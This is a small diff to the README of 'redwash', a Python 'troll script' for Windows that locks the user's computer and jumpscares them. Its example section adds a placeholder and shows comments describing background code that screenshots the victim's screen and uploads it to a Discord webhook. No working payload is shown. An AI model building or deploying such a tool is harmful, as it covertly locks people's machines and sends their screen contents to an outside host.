@@ -3,6 +3,8 @@ A Python (for Windows) troll script that locks the user's computer and jumpscare
 
 ## Example Usage
 ```python
+""" redwash code implementation goes here... """
+
 def otherCode():
     # This is an example of some code you can execute in the background when redwash is running.
     # In this example, we take a screenshot of the user's computer and upload it to a discord webhook.
